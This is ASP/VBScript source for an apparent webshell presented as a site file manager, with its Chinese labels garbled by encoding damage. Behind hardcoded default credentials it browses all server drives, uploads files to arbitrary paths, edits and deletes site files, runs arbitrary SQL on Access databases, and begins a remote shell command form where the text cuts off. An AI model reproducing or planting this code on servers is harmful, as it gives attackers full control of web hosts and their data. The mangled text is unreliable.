<%@ LANGUAGE = VBScript CodePage = 936%>
<%
option explicit
Response.Buffer=True
Server.Scripttimeout=5000
':::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
':::::��ɱ�����ֹ�����ǿ��ɱ��:::::::::::::::::::::::::::::::::::::::::::::::
':::::ʹ�ñ������ǰ���Ƿ��������밲װ�ı���д�����FSO��:::::::::::
':::::����֮�� ����::::::::::::::::::::::::::::::::::::::
':::::����[UserName]="killbase.com"��Ĭ��ֵΪ[killbase.com]:::::::::::::::::::::::::
':::::����[UserPassword]="killbase.com"��Ĭ��ֵΪkillbase.com :::::::::::::::::::
':::::��ӭ�����ҵ���վ��www.killbase.com :::::::::::::::::::::::::
':::::��ӭ����������̳ bbs.killbase.com��:::::::::::::::::::::::::::::::
':::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
%>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>...::::::��ɱ������ASPվ���ļ���������::::::...</title>
<style>
<!--
a            { color: #000080; font-size: 10pt; text-decoration: blink }
a:hover      { color: #9966FF; text-decoration: blink; font-size: 10pt; font-family: ���� }
a:active     { font-family: ����; font-size: 10pt; text-decoration: blink; color: #000080 }
a:link       { color: #000080; font-family: ����; font-size: 10pt; text-decoration:blink }
table        { font-family: ����; font-size: 10pt; word-break: break-all}
td           { font-family: ����; font-size: 10pt; word-break: break-all}
textarea     { font-family: ����; font-size: 10pt}
input        { color: #000080; border: 1px solid #000000; background-color: #F7F7F7; word-break: break-all}
.button       { color: #000000; border: 1px outset #000000; background-color: #C0C0C0; word-break: break-all}
.table1      { font-family: ����; font-size: 10pt; border: 1px solid #F6F6F6; word-break: break-all}
.td1         { font-family: ����; font-size: 10pt; border: 1px solid #F6F6F6; word-break: break-all}
th         { font-family: ����; font-size: 10pt; border: 1px solid #F6F6F6; background-color:#D1D1E0; word-break: break-all}
-->
</style>
<script language="javascript">
<!--
function InSQLString(SQLStrings){
document.DatePathForm.SQLString.value = SQLStrings;
//alert(SQLStrings)
}

function ShowWin(Url,Name,X,Y,K){
if (!K==""){
 var Ask=confirm("��ȷʵҪ����"+K+"������Ҳ����������Ҫ���鷳�������ء�");
    if (Ask){
	window.open(Url,Name,"toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,width="+X+",height="+Y);
	return false;
	}
	
}
if (K==""){
window.open(Url,Name,"toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,width="+X+",height="+Y);
}
}


function setid()
{
var str=""
if(!window.PutFileForm.upcount.value==0)
for(i=1;i<=window.PutFileForm.upcount.value;i++)
str+='�����ļ�'+i+':<input type=file name=file'+i+' size=37><br>';
document.getElementById("nStr").innerHTML= str;
}

function PostSrt(){
var MyRegExp = document.getElementById("nStr").innerHTML
    MyRegExp = MyRegExp.replace(/<!--/ig, "")
    MyRegExp = MyRegExp.replace(/\/\/-->/ig, "");
	//alert(document.getElementById("nStr").innerHTML)
document.EditFileForm.FileStr.value = MyRegExp
}
//-->
</script>
</head>
<body>
<%
'::::::::::::::������������:::::::::::::::::::::

Dim FileName, oPath, allPath, SpPath, Obj
FileName = Request.Servervariables("PATH_INFO")
oPath = Request.Servervariables("APPL_PHYSICAL_PATH")
allPath = Request.Servervariables("PATH_TRANSLATED")
'�õ���ִ���ļ���
SpPath = Right(allPath,Len(allPath)-InstrRev(allPath,"\"))
Set Obj = CreateObject("Scripting.FileSystemObject")
'Response.Write "<br>1."&FileName&"<br>2."&oPath&"<br>3."&allPath
dim Data_5xsoft
On Error Resume Next
Class upload_5xsoft
  
dim objForm,objFile,Version

Public function Form(strForm)
   strForm=lcase(strForm)
   if not objForm.exists(strForm) then
     Form=""
   else
     Form=objForm(strForm)
   end if
 end function

Public function File(strFile)
   strFile=lcase(strFile)
   if not objFile.exists(strFile) then
     set File=new FileInfo
   else
     set File=objFile(strFile)
   end if
 end function


Private Sub Class_Initialize 
  dim RequestData,sStart,vbCrlf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,theFile
  dim iFileSize,sFilePath,sFileType,sFormValue,sFileName
  dim iFindStart,iFindEnd
  dim iFormStart,iFormEnd,sFormName
  Version="����HTTP�ϴ����� Version 2.0"  '�Ǳ�������,�ú���Ϊԭ���߳ɹ�,�ʹ˸�л!
  set objForm=Server.CreateObject("Scripting.Dictionary")
  set objFile=Server.CreateObject("Scripting.Dictionary")
  if Request.TotalBytes<1 then Exit Sub
  set tStream = Server.CreateObject("adodb.stream")
  set Data_5xsoft = Server.CreateObject("adodb.stream")
  Data_5xsoft.Type = 1
  Data_5xsoft.Mode =3
  Data_5xsoft.Open
  Data_5xsoft.Write  Request.BinaryRead(Request.TotalBytes)
  Data_5xsoft.Position=0
  RequestData =Data_5xsoft.Read 

  iFormStart = 1
  iFormEnd = LenB(RequestData)
  vbCrlf = chrB(13) & chrB(10)
  sStart = MidB(RequestData,1, InStrB(iFormStart,RequestData,vbCrlf)-1)
  iStart = LenB (sStart)
  iFormStart=iFormStart+iStart+1
  while (iFormStart + 10) < iFormEnd 
	iInfoEnd = InStrB(iFormStart,RequestData,vbCrlf & vbCrlf)+3
	tStream.Type = 1
	tStream.Mode =3
	tStream.Open
	Data_5xsoft.Position = iFormStart
	Data_5xsoft.CopyTo tStream,iInfoEnd-iFormStart
	tStream.Position = 0
	tStream.Type = 2
	tStream.Charset ="gb2312"
	sInfo = tStream.ReadText
	tStream.Close
	'ȡ�ñ���Ŀ����
	iFormStart = InStrB(iInfoEnd,RequestData,sStart)
	iFindStart = InStr(22,sInfo,"name=""",1)+6
	iFindEnd = InStr(iFindStart,sInfo,"""",1)
	sFormName = lcase(Mid (sinfo,iFindStart,iFindEnd-iFindStart))
	'������ļ�
	if InStr (45,sInfo,"filename=""",1) > 0 then
		set theFile=new FileInfo
		'ȡ���ļ���
		iFindStart = InStr(iFindEnd,sInfo,"filename=""",1)+10
		iFindEnd = InStr(iFindStart,sInfo,"""",1)
		sFileName = Mid (sinfo,iFindStart,iFindEnd-iFindStart)
		theFile.FileName=getFileName(sFileName)
		theFile.FilePath=getFilePath(sFileName)
		'ȡ���ļ�����
		iFindStart = InStr(iFindEnd,sInfo,"Content-Type: ",1)+14
		iFindEnd = InStr(iFindStart,sInfo,vbCr)
		theFile.FileType =Mid (sinfo,iFindStart,iFindEnd-iFindStart)
		theFile.FileStart =iInfoEnd
		theFile.FileSize = iFormStart -iInfoEnd -3
		theFile.FormName=sFormName
		if not objFile.Exists(sFormName) then
		  objFile.add sFormName,theFile
		end if
	else
	'����Ǳ���Ŀ
		tStream.Type =1
		tStream.Mode =3
		tStream.Open
		Data_5xsoft.Position = iInfoEnd 
		Data_5xsoft.CopyTo tStream,iFormStart-iInfoEnd-3
		tStream.Position = 0
		tStream.Type = 2
		tStream.Charset ="gb2312"
	        sFormValue = tStream.ReadText 
	        tStream.Close
		if objForm.Exists(sFormName) then
		  objForm(sFormName)=objForm(sFormName)&", "&sFormValue		  
		else
		  objForm.Add sFormName,sFormValue
		end if
	end if
	iFormStart=iFormStart+iStart+1
	wend
  RequestData=""
  set tStream =nothing
End Sub

Private Sub Class_Terminate  
 if Request.TotalBytes>0 then
	objForm.RemoveAll
	objFile.RemoveAll
	set objForm=nothing
	set objFile=nothing
	Data_5xsoft.Close
	set Data_5xsoft =nothing
 end if
End Sub
   
 
 Private function GetFilePath(FullPath)
  If FullPath <> "" Then
   GetFilePath = left(FullPath,InStrRev(FullPath, "\"))
  Else
   GetFilePath = ""
  End If
 End  function
 
 Private function GetFileName(FullPath)
  If FullPath <> "" Then
   GetFileName = mid(FullPath,InStrRev(FullPath, "\")+1)
  Else
   GetFileName = ""
  End If
 End  function
End Class

Class FileInfo
  dim FormName,FileName,FilePath,FileSize,FileType,FileStart
  Private Sub Class_Initialize 
    FileName = ""
    FilePath = ""
    FileSize = 0
    FileStart= 0
    FormName = ""
    FileType = ""
  End Sub
  
 Public function SaveAs(FullPath)
    dim dr,ErrorChar,i
    SaveAs=true
    if trim(fullpath)="" or FileStart=0 or FileName="" or right(fullpath,1)="/" then exit function
    set dr=CreateObject("Adodb.Stream")
    dr.Mode=3
    dr.Type=1
    dr.Open
    Data_5xsoft.position=FileStart
    Data_5xsoft.copyto dr,FileSize
    dr.SaveToFile FullPath,2
    dr.Close
    set dr=nothing 
    SaveAs=false
  end function
  End Class


Public Function Show(ErrString)
Response.Write "<FONT COLOR='#FF0000'><li>"&ErrString&"</FONT><br>"
Response.Write "<br><CENTER><INPUT type='text' name='T1' size='15' style='color: #000080; font-family: ����; font-weight: bold; background-color: #FFFFFF; border: 1 double #FFFFFF'>"&Chr(13)
Response.Write "<SCRIPT LANGUAGE='vbScript'>"&Chr(13)&_
"Dim l,t1,t2,thetime,isStop"&Chr(13)&_    
"t1=timer+3"&Chr(13)&_
"isStop = False"&Chr(13)&_ 
"Sub tx()"&Chr(13)&_
"if isStop then"&Chr(13)&_
"exit Sub"&Chr(13)&_
"else"&Chr(13)&_
"setTimeout""tx()"",""1000"""&Chr(13)&_
"end if"&Chr(13)&_    
"t2=timer"&Chr(13)&_
"thetime=int(t1)-int(t2)"&Chr(13)&_            
"document.all.T1.value=thetime&"" ���Ӻ�رձ����ڣ�http://www.killbase.com/"""&Chr(13)&_
"if thetime=""0"" or thetime<""0"" then"&Chr(13)&_
"window.close()"&Chr(13)&_
"isStop=True"&Chr(13)&_
"end if"&Chr(13)&_
"End Sub"&Chr(13)&_
"Call tx()"&Chr(13)&_
"</SCRIPT></CENTER>"
End Function
'��ֹ��ִ���ļ�������!
Public Function IsRoot(PathStr)
If Lcase(PathStr) = Lcase(allPath) Then
Show("���ܶ���ִ�г�����в���;�������Ѿ�����ֹ.")
Response.End
End If
End Function
Function IsObjInstalled(strClassString)
	On Error Resume Next
	IsObjInstalled = False
	Err = 0
	Dim xTestObj
	Set xTestObj = Server.CreateObject(strClassString)
	If 0 = Err Then IsObjInstalled = True
	Set xTestObj = Nothing
	Err = 0
End Function


%> <div align="center"><table border="0" width="450" id="table1" cellspacing="0"><tr><td><%
If Request.QueryString("Work") = "outlogin" Then
   Session("UserCokis_Name") =""
   Session("UserCokis_Pass") =""
   Show("�˳��ɹ�!")
   Response.Write"<script>opener.window.location.reload()</script>"
   Response.end
End If
If Session("UserCokis_Name") ="" Or Session("UserCokis_Pass") ="" Then
Response.Write"<form method='POST' action='"&Filename&"?Work=login' name='LoginForm'>"&_
"<p align='center'>�û�����<input type='text' name='MyName' size='10'>"&Chr(13)&"��֤�룺<input type='password' name='MyPass' size='10'>"&Chr(13)&"<input type='submit' value='��½' name='B1' class='button'></p></form>"

If Request.QueryString("Work") = "login" Then
  Dim UserName,UserPassword,PostName,PostPW
   PostName = Trim(Request("MyName"))
   PostPW = Request("MyPass")
   UserName = "killbase.com"
   UserPassword = "killbase.com"
 If UserName = PostName  And UserPassword = PostPW  Then
   Session("UserCokis_Name") = PostName
   Session("UserCokis_Pass") = PostPW
   Response.Redirect Filename
Else
   Response.Write "<p align='center'><font color=red>��֤δͨ����</font></p>"
 End If
 
End If
If Not IsObjInstalled("Scripting.FileSystemObject") Then
Response.Write"<li>�ǳ��ź�������������֧��FSO��������ȫ�������޷����У�http://www.killbase.com/"
Response.End
Else
Response.Write"<li>��������֧��FSO��������ʹ�ñ��������Զ����վ�ļ����������www.killbase.com/<br>"
Response.Write"<li>Ϊ�˷�ֹ������ɾ�������鱾�ļ�Ӧ��װ����վ�ĸ�Ŀ¼�¡�"
End If

Else
Sub SaveUp()
Dim Upload,File,Formname,Formpath,Icount
Icount = 0
Set Upload=New Upload_5xsoft ''�����ϴ�����
If Upload.Form("PutPaht")="" Then   ''�õ��ϴ�Ŀ¼
 Show("������Ҫ�ϴ���Ŀ¼!")
 Set Upload=Nothing
Else
 Formpath=Upload.Form("PutPaht")
 If Right(Formpath,1)<>"\" Then Formpath=Formpath&"\" 
End If
For Each Formname In Upload.Objfile ''�г������ϴ��˵��ļ�
 Set File=Upload.File(Formname)  ''����һ���ļ�����
If File.Filesize > 0 Then         ''��� Filesize > 0 ˵�����ļ�����
  File.Saveas Formpath&File.Filename  ''�����ļ�
  Response.Write "<li>�����ļ���"&File.Filepath&File.Filename&"<br>"
  Response.Write "<li>��С��"
     If Formatnumber(File.Filesize/1024)< 1 then
       Response.Write"0"&Formatnumber(File.Filesize/1024)
     Else
       Response.Write Formatnumber(File.Filesize/1024) 
     End If
  Response.Write "(KB)<br><li>�ɹ��ϴ�����"&Formpath&File.Filename&"<br>"
  Icount=Icount+1
End If
 Set File=Nothing
Next
Set Upload=Nothing  ''ɾ���˶���
If Icount>0 Then
Show("���У�"&Icount&" ���ļ��ɹ��ϴ���")
Response.Write"<script>opener.window.location.reload()</script>"
Else
Show("û���ļ��ϴ�")
End If
End Sub

%> <%Sub UpFileWim(PutPath)%> <table border="1" width="100%" id="table2" class="td1"><tr><form method="POST" action="<%=FileName%>?Work=PutFile" name="PutFileForm" enctype="multipart/form-data"><th colspan="2">�ļ��ϴ�</th></tr><tr><td class="td1" align="right" width="16%">�ϴ�·��:</td><td class="td1" width="81%"><input type="text" name="PutPaht" size="50" value="<%=PutPath%>" ReadOnly></td></tr><tr><td class="td1" align="right" width="16%">�ϴ�����:</td><td class="td1" width="81%"><input type="text" name="upcount" size="10" value="1" maxlength="1"> <input type="button" name="Bn" onclick="setid();" value="�趨" class="button"> (<FONT COLOR="#FF0000">ֻ��ͬʱ�ϴ�9�����µ��ļ�.</FONT>) </td></tr><tr><td class="td1" align="center" colspan="2"><SPAN id="nStr"></SPAN></td></tr><tr><td class="td1" align="center" colspan="2"><input type="submit" value="ȷ���ϴ�" name="B1" class="button"></td></form></tr></table><%End Sub%> <%
Sub SaveFolder(FolderPath,FolderName)
On Error Resume Next
If Instr(FolderPath,":")=0 Then
       FolderPath=Server.Mappath(FolderPath)
End If
If FolderName = "" Then
Show("�������ļ������ơ�")
	   Exit Sub
End If
If (Obj.FolderExists(FolderPath&"\"&FolderName)) Then
    Show("�ļ����Ѿ�����,�����ٽ���.")
	Exit Sub
  Else
    Obj.CreateFolder(FolderPath&"\"&FolderName)
	If Err Then
	 Show("�޷������ļ���.ԭ����:"&Err.Description)
	 Err.Clear
	 Exit Sub
	 Else
	Show("���Ѿ��ɹ�����"&FolderPath&"�½�����Ϊ:"&FolderName&"���ļ���.")
	Response.Write"<script>opener.window.location.reload()</script>"
	End If
  End If
End Sub
%> <%
Sub FolderWin(NewFolderPath)
%> <!--�½��ļ��д�����濪ʼ-->��<table border="0" width="100%" id="table3" class="table1"><tr><form method="POST" action="<%=FileName%>?Work=NewFolder" name="NewFolderForm"><th colspan="2">�½��ļ���</th></tr><tr><td class="td1" width="15%" align="right">Ŀ��·��:</td><td class="td1" width="81%"><input type="text" name="FolderPath" size="51" value="<%=NewFolderPath%>" readOnly></td></tr><tr><td class="td1" width="15%" align="right">�ļ�����:</td><td class="td1" width="81%"><input type="text" name="NewFolder" size="20" maxlength="20" value="<%=Date()%>">(<font color="#FF0000">ע��:��Ҫд��̫����</font>)</td></tr><tr><td class="td1" align="center" colspan="2"><input type="submit" value="�ύ" name="B2" class="button"></td></form></tr></table><!--�½��ļ��д���������--><%End Sub%> <%
Sub SaveFile(SavePath,NewFileName)
On Error Resume Next
Dim f
If Instr(SavePath,":")=0 Then
       SavePath=Server.Mappath(SavePath)
End If
If NewFileName = "" Then
Show("�ļ����Ʋ���Ϊ�ա�")
Exit Sub
End If
Set f = Obj.CreateTextFile(SavePath&"\"&NewFileName,False)
	If Err Then
	 Show("�޷������ļ�.ԭ����:"&Err.Description)
	 Err.Clear
	 Else
	Show("���Ѿ��ɹ�����"&SavePath&"�½�����Ϊ:"&NewFileName&"���ļ�.")
	Response.Write"<script>opener.window.location.reload()</script>"
	End If
End Sub
%> <%Sub FileWin(NewFilePath)%> <!--�½����ļ�������濪ʼ-->��<table border="0" width="100%" id="table5" class="table1"><tr><form method="POST" action="<%=FileName%>?Work=NewFile" name="NewFileForm"><th colspan="2">�½�һ�����ļ�</th></tr><tr><td class="td1" align="right" width="15%">Ŀ��·��:</td><td class="td1" width="82%"><input type="text" name="FilePath" size="51" value="<%=NewFilePath%>" readOnly></td></tr><tr><td class="td1" align="right" width="15%">�ļ�����:</td><td class="td1" width="82%"><input type="text" name="NewFileName" size="20" maxlength="20" value="<%=Replace(Date(),"-","")&Replace(Time(),":","")%>.htm">(<font color="#FF0000">ע��:��д�������Ƽ���׺��</font>)</td></tr><tr><td class="td1" align="center" colspan="2"><input type="submit" value="�ύ" name="B3" class="button"> </td></form></tr></table><!--�½����ļ�����������--><%End Sub%> <%
Sub CopyFile(CopyPath,CopyName)
On Error Resume Next 
Dim cFile
If Instr(CopyName,":")=0 Then
       CopyName=Server.Mappath(CopyName)
End If
    Set cFile = Obj.GetFile(CopyPath)
    cFile.Copy (CopyName)
	If Err Then
	 Show("�޷������ļ�.ԭ����:"&Err.Description)
	 Err.Clear
	 Else
	Show("�ļ��Ѿ��ɹ����Ƶ�:"&CopyName)
	Response.Write"<script>opener.window.location.reload()</script>"
	End If
End Sub
%> <%Sub CopyFileWin(CopyPath)%> <table border="0" width="100%" id="table6" class="table1"><tr><form method="POST" action="<%=FileName%>?Work=CopyFiles" name="CopyForm"><th colspan="2">�ļ�����</th></tr><tr><td class="td1" width="17%" align="right">Դ�ļ���</td><td class="td1" width="80%"><input type="text" name="CopyPath" size="47" readonly value="<%=CopyPath%>"> </td></tr><tr><td class="td1" width="17%" align="right">Ŀ���ļ���</td><td class="td1" width="80%"><input type="text" name="NewCopyName" size="47" value="<%=CopyPath%>"><br>(<font color="#FF0000">ע�⣺���������������·�������·�����ļ����ͺ�׺��</font>)</td></tr><tr><td class="td1" align="center" colspan="2"><input type="submit" value="����" name="B4" class="button"></td></form></tr></table><%End Sub%> <%Sub ListFileWin(ListPath)
On Error Resume Next 
If ListPath="" Then
ListPath = Server.Mappath("\")
End If
Dim AllFolder,ItFolserd,FL,dr
Set AllFolder = Obj.GetFolder(ListPath)
Set ItFolserd = AllFolder.SubFolders
%> <table border="0" width="100%" id="table4" class="table1" bgcolor="#F6F6F6" cellspacing="0" cellpadding="0"><tr><th colspan="2">�ļ����ļ����б�</th></tr><tr><td bgcolor="#EAEAEA" class="td1" colspan="2">��ǰ·��:<%=ListPath%></td></tr><tr><td bgcolor="#F6F6F6" class="td1" colspan="2"><%
For Each Dr in Obj.Drives
Response.write "<a href='"&FileName&"?Work=ShowListFileWin&ListPath="&Dr.DriveLetter&":'>"&Dr.DriveLetter&"��:</a>        "
NEXT
%> </td></tr><%
If Err Then
Show("�ź�;û�����Ȩ��;")
Exit Sub
Else
For Each FL in ItFolserd
%> <tr onmouseover="this.bgColor='#CCFF99';" onmouseout="this.bgColor='#F6F6F6'"><td class="td1" width="61%" title="�ļ���: <%=FL.name%>"><font face="Wingdings" color="#FF9933">1</font> <A HREF="<%=FileName%>?Work=ShowListFileWin&ListPath=<%=ListPath&"\"&FL.name%>" title="����ʱ��:<%=FL.DateCreated&Chr(10)%>������:<%=FL.DateLastAccessed&Chr(10)%>����޸�:<%=FL.DateLastModified&Chr(10)%>���ƴ�С:<%=FL.size\1024%>(KB)"><%=FL.name%></A> </td><td class="td1" width="37%">&nbsp; [<A HREF="#" onClick="JavaScript:ShowWin('<%=Filename%>?Work=ShowDelFolderwin&DelFolderPath=<%=replace(ListPath&"\"&FL.name,"\","\\")%>','FdelWin','500','150','ɾ��')" title="ɾ��[<%=FL.name%>]�ļ���"><FONT COLOR="#FF0000">ɾ��</FONT></A>]��</td></tr><%
Next
End If
Dim SiteUrl,Item
		  if ListPath = Server.MapPath("\") Then
		  SiteUrl = "/"
		  else
		  SiteUrl = "/"&Right(ListPath,Len(ListPath)-Len(oPath))&"/"
		  end if
		  Dim Ac
 For Each Item In AllFolder.Files 
%> <tr onmouseover="this.bgColor='#CCFF99';" onmouseout="this.bgColor='#F6F6F6'"><td height="17" class="td1" width="61%" title="�ļ�: <%=Item.name%>"><font face="Wingdings" color="#FF0000">y</font> <A target="_blank" HREF="<%=SiteUrl&Item.name%>" title="����ʱ��:<%=Item.DateCreated&Chr(10)%>�޸�ʱ��:<%=Item.DateLastModified&Chr(10)%>�ļ���С:<%If Formatnumber(Item.Size/1024)< 1 then Response.Write"0"&Formatnumber(Item.Size/1024) Else Response.Write Formatnumber(Item.Size/1024) End If%>(KB)"><%=Item.name%></A> </td><td height="17" class="td1" width="37%">��[<A HREF="#" onClick="JavaScript: ShowWin('<%=Filename%>?Work=ShowDelFilewin&DelPath=<%=replace(ListPath&"\"&Item.name,"\","\\")%>','delWin','500','150','ɾ��')" title="ɾ��[<%=Item.name%>]�ļ�"><FONT COLOR="#FF0000">ɾ��</FONT></A>] [<A HREF="#" onClick="JavaScript:ShowWin('<%=Filename%>?Work=ShowCopyFileWin&CopyPath=<%=replace(ListPath&"\"&Item.name,"\","\\")%>','CopyWin','500','190','')" title="����:<%=Item.name%>"><FONT COLOR='#FF9933'>����</FONT></A>] 
<%
Ac = split(Item.name,".")
If Lcase(Ac(UBound(Ac,1)))="txt" Or Lcase(Ac(UBound(Ac,1)))="htm" Or Lcase(Ac(UBound(Ac,1)))="asa" Or Lcase(Ac(UBound(Ac,1)))="html" Or Lcase(Ac(UBound(Ac,1)))="shtml" Or Lcase(Ac(UBound(Ac,1)))="asp" Or Lcase(Ac(UBound(Ac,1)))="inc" Or Lcase(Ac(UBound(Ac,1)))="ini" Or Lcase(Ac(UBound(Ac,1)))="m3u"  Or Lcase(Ac(UBound(Ac,1)))="cer" Or Lcase(Ac(UBound(Ac,1)))="htr" Or Lcase(Ac(UBound(Ac,1)))="js" Or Lcase(Ac(UBound(Ac,1)))="css" Or Lcase(Ac(UBound(Ac,1)))="cdx" Then%> [<A HREF="#" onClick="JavaScript:ShowWin('<%=Filename%>?Work=ShowEditFileWin&EditPath=<%=replace(ListPath&"\"&Item.name,"\","\\")%>','EditWin','500','450','')" title="�༭[<%=Item.name%>]�ļ�">�༭</A>] <%End if%> <%If  Lcase(Ac(UBound(Ac,1)))="mdb" Then %> [<A HREF="#" onClick="JavaScript:ShowWin('<%=Filename%>?Work=ShowMdbWin&MdbPath=<%=replace(ListPath&"\"&Item.name,"\","\\")%>','mdbWin','500','190','')" title="ѹ��[<%=Item.name%>]���ݿ�"><FONT COLOR="#993300">ѹ��</FONT></A>] <%End If%> </td></tr><%Next%> <tr><td class="td1" align="center" colspan="2"><FONT COLOR="#009900"><li>��ʾ:����ļ������� WEB �������! </FONT><br>[<a href="#" onClick="javascript:history.back();" title="������һ��Ŀ¼"><font color="#FF0000">����</font></a>] [<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowListFileWin&ListPath=<%=Replace(Server.Mappath("\"),"\","\\")%>','ListWin','500','500','')" title="���ظ�Ŀ¼"><font color="#FF0000">���ظ�Ŀ¼</font></a>] [<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowUpFileWin&PutPath=<%=Replace(ListPath,"\","\\")%>','UpWin','500','300','','')" title="�ڱ�Ŀ¼���ϴ��ļ�"><font color="#FF0000">�ļ��ϴ�</font></a>] [<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowFileWin&NewFilePath=<%=Replace(ListPath,"\","\\")%>','FileWin','500','190','','')" title="�ڱ�Ŀ¼���½����ļ�"><font color="#FF0000">�½��ļ�</font></a>] [<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowFolderWin&NewFolderPath=<%=Replace(ListPath,"\","\\")%>','FolderWin','500','190','','')" title="�ڱ�Ŀ¼���½��ļ���"><font color="#FF0000">�½��ļ���</font></a>] </td></tr></table><%End Sub%> <%
Sub SaveEditFile(ReFilePath,EditStrings)

On Error Resume Next
Dim MyWrite
Set MyWrite = Obj.OpenTextFile(ReFilePath, 2)
MyWrite.WriteLine(EditStrings)
If Err Then
Show("�ź�,û�в���Ȩ��.")
Else
Show("�ļ��޸ĳɹ�!")
End If
Set Obj = Nothing
End Sub
Sub EditFile(GetMyFilePath)
Call IsRoot(GetMyFilePath)
On Error Resume Next
Dim MyRead,Strings
Set MyRead = Obj.OpenTextFile(GetMyFilePath, 1, True, 0)
Strings = MyRead.ReadAll
MyRead.Close
'���²�������Դ�HTML�ĵ�ʱ�Ĵ���
'���ĵ����HTMLע�ͱ�עȥ����
Strings = Replace(Strings,"<!--", "")
Strings = Replace(Strings,"//-->", "")
Strings = Replace(Strings,"-->", "")
%> <table border="0" width="100%" id="table11" class="table1"><tr><form method="POST" name="EditFileForm" action="<%=FileName%>?Work=PostEditFile&ReFilePath=<%=GetMyFilePath%>"><th>�ļ��༭</th></tr><tr><td class="td1">��ǰ�ļ�:<FONT COLOR="#FF3300"><%=GetMyFilePath%></FONT></td></tr><tr><td class="td1" align="center"><%Response.Write"<SPAN id='nStr' style='display:none'><!--"&Trim(Strings)&"//--></SPAN>"&Chr(13)%> <textarea rows="24" name="FileStr" cols="59"></textarea> </td></tr><tr><td class="td1">(<FONT COLOR="#FF0000">ע�⣺�ڵ������ļ����ݵĹ����У����е�"&lt;!--"��"//--&gt;"��"--&gt;"����Ѿ�ȫ�����ˣ��ڱ༭�����б���Ҫע���ļ����ݵ������ԡ�</FONT>)</td></tr><tr><td class="td1" align="center"><input type="submit" value="�ύ" name="B10"></td></form></tr></table><SCRIPT LANGUAGE="JavaScript">
<!--
PostSrt()
//-->
</SCRIPT>
<%End Sub%> <%
'���ݿ�ر�
Public Function CloseDate()
Conn.close
Set conn = Nothing
End Function
'Access����
Public Function Access(Paths)
On Error Resume Next
dim conn,connstr
If Instr(Paths,":")=0 Then
       Paths=Server.Mappath(Paths)
End If
Set conn = Server.CreateObject("ADODB.Connection")
connstr="Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & Paths
conn.Open connstr
If Err Then
		err.Clear
		Call CloseDate()
		Response.Write "���ݿ����ӳ�����ѡ����ȷ��·����"
		Response.End
End If
End Function

Public Function MyDataEdit()
Dim PostB1,MyRadio,DataPaht,User,Pass,SQLString
'���� Or ִ��
PostB = Request.Form("B5")
'���ݿ�����
MyRadio = Request.Form("DateType")
'���ݿ�·��
DataPaht = Trim(Request.Form("DataPaht"))
'�û���
User = Request.Form("User")
Pass = Request.Form("Password")
'SQL���
SQLString = Request.Form("SQLString")
'���ݿ����ӿ�ʼ:
Select Case MyRadio
       Case "Access"
       Call Access(DataPaht)
       Case "MsSQL"
Response.Write "MsSQL"
End Select
Select Case PostB
       Case "����"
Response.Write "����"
       Case "ִ��"
Response.Write "ִ��"
End Select
Response.Redirect Filename&"?Work=ShowGetDataWin&DatePaht="&DataPaht
End Function

%> <%Sub GetDataWin()
Dim DatePath,IsData
DatePath = Request("DatePaht")
%> ��<table border="1" width="100%" id="table7" class="table1"><tr><form method="POST" action="<%=FileName%>?Work=CallData" name="DatePathForm"><th colspan="2">���ݿ����</th></tr><%If DatePath = "" Then%> <tr><td class="td1" width="18%" align="right">Ŀ�����ݿ�:</td><td class="td1" width="78%">(<font color="#FF0000">ע��:��д���·�������·��</font>)<br><input type="text" name="DataPaht" size="49" value="/MyData.mdb"> <br>Access���ݿ�:<input type="radio" name="DateType" value="Access" checked> 
		SQL���ݿ�:<input type="radio" name="DateType" value="MsSQL"> </td></tr><tr><td class="td1" colspan="2" align="center">�û�:<input type="text" name="User" size="17"> ����:<input type="text" name="Password" size="17"></td></tr><tr><td class="td1" colspan="2" align="center"><input type="submit" value="����" name="B5" class="button"></td></tr><%Else
'��ȡ���ݿ�ı�
'Set Rsschema=conn.Openschema(20)
'Rsschema.Movefirst
'Do Until Rsschema.Eof
'If Rsschema("Table_type")="Table" Then
'response.write "<script>document.getElementById(""DataInfo"").innerHTML="&Rsschema("Table_name") & "<Br>"
'End If
'Rsschema.Movenext
'Loop
'Set conn=Nothing
%> <tr><td class="td1" width="18%" align="right">�ɹ�����:</td><td class="td1" width="78%"><input type="text" name="DataPaht" size="47"value="<%=DatePath%>" readonly></td></tr><tr><td class="td1" colspan="2" align="center"><font color="#FF0000">SQL���:</font><br>

<textarea rows="8" name="SQLString" cols="59"></textarea></td></tr><tr><td class="td1" colspan="2" align="center">[<a href="#" onclick='JavaScript:InSQLString("Create Table [���ݱ�����(�ֶ�1 ����1(����),�ֶ�2 ����2(����) ���� )]")'>�½���</a>] [<a href="#" onclick='JavaScript:InSQLString("Drop Table [���ݱ�����]")'>ɾ����</a>] [<a href="#" onclick='JavaScript:InSQLString("Select * From [���ݱ�] Where [�ֶ���] Order by [�ֶ���] [desc]")'>order by</a>] [<a href="#" onclick='JavaScript:InSQLString("Insert into [Ŀ�����ݱ�] Select * From [Դ���ݱ�]")'>��������</a>]<br>[<a href="#" onclick='JavaScript:InSQLString("Insert Into [���ݱ�] (�ֶ�1,�ֶ�2,�ֶ�3 ��) Valuess (ֵ1,ֵ2,ֵ3 ��)")'>�������</a>] [<a href="#" onclick='JavaScript:InSQLString("Delete From [���ݱ�] Where [�������ʽ]")'>ɾ������</a>] [<a href="#" onclick='JavaScript:InSQLString("Update [���ݱ�] Set [�ֶ���]=[�ֶ�ֵ] Where [�������ʽ]")'>��������</a>] [<a href="#" onclick='JavaScript:InSQLString("Select * From [���ݱ�]")'>��ȡ����</a>]</td></tr><tr><td class="td1" colspan="2" align="center"><div id="DataInfo">fffff</div></td></tr><tr><td class="td1" colspan="2" align="center"><input type="submit" value="ִ��" name="B5" class="button"></td></form></tr><%End If%> </table><%End Sub%> <%Sub ShellWin(MyCommand)%> ��<table border="1" width="100%" id="table8" class="table1"><tr><form method="POST" action="<%=Filename%>?Work=ShowShellForm" name="RunShellform"><th colspan="2">Զ��Shellִ��</th></tr><tr><td class="td1" width="12%" align="right">������:</td><td 